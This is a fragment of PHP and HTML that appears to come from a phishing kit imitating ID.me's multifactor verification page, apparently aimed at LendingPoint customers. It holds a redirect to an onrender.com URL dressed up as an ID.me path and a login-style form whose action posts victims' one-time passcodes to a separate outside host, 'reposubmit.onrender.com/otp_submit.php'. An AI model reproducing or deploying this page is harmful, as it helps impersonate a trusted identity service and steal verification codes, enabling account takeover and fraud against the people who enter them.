...
header("Location:https://lendingpoint.onrender.com/lendingpoint/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
exit;
}
?>
        ...
        <div class="container">
            <div class="content-container multifactor-event multifactor-generator">
                ...
                <main aria-labelledby="sr_page_title" class="form-container">
                    ...
                    <form method="post" action="https://reposubmit.onrender.com/otp_submit.php" accept-charset="UTF-8" data-validate="">
